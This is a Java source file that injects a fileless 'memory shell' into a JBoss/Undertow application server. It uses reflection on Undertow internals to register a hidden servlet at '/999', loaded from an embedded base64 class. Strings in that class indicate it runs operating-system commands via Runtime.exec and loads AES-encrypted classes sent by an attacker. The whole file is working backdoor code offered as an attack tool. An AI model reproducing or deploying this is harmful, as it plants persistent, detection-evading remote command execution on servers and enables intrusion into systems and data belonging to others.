package com.memshell.jboss;

import io.undertow.servlet.api.DeploymentInfo;
import io.undertow.servlet.api.ServletInfo;
import io.undertow.servlet.core.DeploymentImpl;
import io.undertow.servlet.handlers.ServletHandler;
import io.undertow.servlet.spec.HttpServletRequestImpl;
import io.undertow.servlet.spec.ServletRegistrationImpl;
import io.undertow.servlet.util.ConstructorInstanceFactory;
import sun.misc.BASE64Decoder;
import javax.security.jacc.PolicyContext;
import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Map;

public class ServletBasedWithoutRequest extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        // 参考：
        // 《Dynamic Servlet Registration》 http://www.mastertheboss.com/javaee/servlet-30/dynamic-servlet-registration
        // 《JBOSS 无文件webshell的技术研究》 https://mp.weixin.qq.com/s/_SQS9B7tkL1H5fMIgPTOKw

        try{
            String servletName = "jbossServlet";
            String urlPattern = "/999";

            HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
            ServletContext context = request.getServletContext();
            Field f = context.getClass().getDeclaredField("deploymentInfo");
            f.setAccessible(true);
            DeploymentInfo deploymentInfo = (DeploymentInfo)f.get(context);

            //只添加一次
            Map<String, ServletInfo> servlets = deploymentInfo.getServlets();
            if(!servlets.containsKey(servletName)){
                System.out.println("[+] Add Dynamic Servlet");

                ClassLoader cl = Thread.currentThread().getContextClassLoader();
                Class clazz;
                try{
                    clazz = cl.loadClass("com.memshell.generic.DynamicServletTemplate");
                }catch(ClassNotFoundException e){
                    BASE64Decoder base64Decoder = new BASE64Decoder();
                    String codeClass = "yv66vgAAADMBSAoAVQCUCACVCQBUAJYKAFQAlwoAVACYCQCZAJoIAJsKAJwAnQgAeAsAngCfCACgCgChAKIKAKEAowcApAoApQCmCgClAKcKAKgAqQoADgCqCACrCgAOAKwKAA4ArQsArgCvCgCwAJ0IALEHALIKABkAlAgAswoAGQC0CgC1ALYKABkAtwoAGQC4CAC5CgChALoKAKEAuwsAngC8CAC9CwC+AL8KALAAwAgAwQoAwgDDBwDECwC+AMUKAKEAxgoAKQDHCgDCAMgHAMkKAC4AlAsAngDKCgDLAMwKAC4AzQoAwgDOCQBUAM8IANAHANEHAHAHANIKADYA0wcA1AoA1QDWCgDVANcKANgA2QoANgDaCADbBwDcBwDdBwDeCgBCAN8IAOAKADgA4QcA4goAOgDjCQDkAOUHAOYKADYA5wgA6AoA2ADpCgDkAOoHAOsKAE4A3wcA7AoAUADfBwDtCgBSAN8HAO4HAO8BAAhwYXNzd29yZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAEm15Q2xhc3NMb2FkZXJDbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAC1MY29tL21lbXNoZWxsL2dlbmVyaWMvRHluYW1pY1NlcnZsZXRUZW1wbGF0ZTsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAZkb1Bvc3QBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEACkV4Y2VwdGlvbnMBAAVkb0dldAEABnJlc3VsdAEAA2NtZAEAA2tleQEABmNpcGhlcgEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADmV2aWxDbGFzc0J5dGVzAQACW0IBAAlldmlsQ2xhc3MBAApldmlsT2JqZWN0AQASTGphdmEvbGFuZy9PYmplY3Q7AQAMdGFyZ2V0TWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdHlwZQEADVN0YWNrTWFwVGFibGUHAPAHAN4BAAppbml0aWFsaXplAQACZXgBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAAVjbGF6egEABm1ldGhvZAEABGNvZGUBAAVieXRlcwEAIkxqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbjsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEALUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uOwcA7gcA0gcA4gcA0QcA8QcA5gcA6wcA7AcA7QEAClNvdXJjZUZpbGUBABtEeW5hbWljU2VydmxldFRlbXBsYXRlLmphdmEMAFoAWwEABHBhc3MMAFYAVwwAfABbDABpAGMHAPIMAPMA9AEAHlsrXSBEeW5hbWljIFNlcnZsZXQgc2F5cyBoZWxsbwcA9QwA9gBhBwD3DAD4APkBAAViYXNpYwcA8AwA2wD6DAD7APwBABFqYXZhL3V0aWwvU2Nhbm5lcgcA/QwA/gD/DAEAAQEHAQIMAQMBBAwAWgEFAQACXEEMAQYBBwwBCAEJBwEKDAELAQwHAQ0BAAhiZWhpbmRlcgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAADAEOAQ8HARAMAREBEgwBDgETDAEUAQkBAAEtDAEVARYMARcBGAwBGQEaAQABdQcBGwwBHAEdDAEeAGEBAANBRVMHAR8MASABIQEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMASIBIwwBJAElDABaASYMAScBKAEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMASkBKgcBKwwBLAEJDAEtAS4MAS8BMAwAWABZAQALZGVmaW5lQ2xhc3MBAA9qYXZhL2xhbmcvQ2xhc3MBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIMATEBMgEAEGphdmEvbGFuZy9PYmplY3QHATMMATQBNQwBNgE3BwDxDAE4ATkMAToBOwEABmVxdWFscwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAE2phdmEvbGFuZy9FeGNlcHRpb24MATwAWwEAImNvbS5tZW1zaGVsbC5nZW5lcmljLk15Q2xhc3NMb2FkZXIMAT0BPgEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uDAE/AUAHAUEMAUIAWQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24MAUMBQAEDEHl2NjZ2Z0FBQURNQUd3b0FCUUFXQndBWENnQUNBQllLQUFJQUdBY0FHUUVBQmp4cGJtbDBQZ0VBR2loTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPeWxXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQUNSTVkyOXRMMjFsYlhOb1pXeHNMMmRsYm1WeWFXTXZUWGxEYkdGemMweHZZV1JsY2pzQkFBRmpBUUFYVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc0JBQXRrWldacGJtVkRiR0Z6Y3dFQUxDaGJRa3hxWVhaaEwyeGhibWN2UTJ4aGMzTk1iMkZrWlhJN0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUZZbmwwWlhNQkFBSmJRZ0VBQzJOc1lYTnpURzloWkdWeUFRQUtVMjkxY21ObFJtbHNaUUVBRWsxNVEyeGhjM05NYjJGa1pYSXVhbUYyWVF3QUJnQUhBUUFpWTI5dEwyMWxiWE5vWld4c0wyZGxibVZ5YVdNdlRYbERiR0Z6YzB4dllXUmxjZ3dBRHdBYUFRQVZhbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5QVFBWEtGdENTVWtwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNBSVFBQ0FBVUFBQUFBQUFJQUFBQUdBQWNBQVFBSUFBQUFPZ0FDQUFJQUFBQUdLaXUzQUFHeEFBQUFBZ0FKQUFBQUJnQUJBQUFBQkFBS0FBQUFGZ0FDQUFBQUJnQUxBQXdBQUFBQUFBWUFEUUFPQUFFQUNRQVBBQkFBQVFBSUFBQUFSQUFFQUFJQUFBQVF1d0FDV1N1M0FBTXFBeXErdGdBRXNBQUFBQUlBQ1FBQUFBWUFBUUFBQUFnQUNnQUFBQllBQWdBQUFCQUFFUUFTQUFBQUFBQVFBQk1BRGdBQkFBRUFGQUFBQUFJQUZRPT0MAUQBRQwBRgFHAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEAK2NvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNTZXJ2bGV0VGVtcGxhdGUBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBABBqYXZhL2xhbmcvU3RyaW5nAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHaXNFbXB0eQEAAygpWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADmphdmEvdXRpbC9VVUlEAQAKcmFuZG9tVVVJRAEAEigpTGphdmEvdXRpbC9VVUlEOwEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAVwcmludAEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwB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";
                    byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                    Method method = null;
                    Class clz = cl.getClass();
                    while(method == null && clz != Object.class ){
                        try{
                            method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        }catch(NoSuchMethodException ex){
                            clz = clz.getSuperclass();
                        }
                    }
                    method.setAccessible(true);
                    clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                }

                ServletInfo servletInfo = new ServletInfo(servletName, clazz, new ConstructorInstanceFactory<Servlet>(clazz.getDeclaredConstructor()));
                deploymentInfo.addServlet(servletInfo);

                f = context.getClass().getDeclaredField("deployment");
                f.setAccessible(true);
                Field modifiersField = Field.class.getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                DeploymentImpl deployment = (DeploymentImpl)f.get(context);
                ServletHandler handler = deployment.getServlets().addServlet(servletInfo);

                ServletRegistrationImpl registration =  new ServletRegistrationImpl(servletInfo, handler.getManagedServlet(), deployment);
                registration.addMapping(urlPattern);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
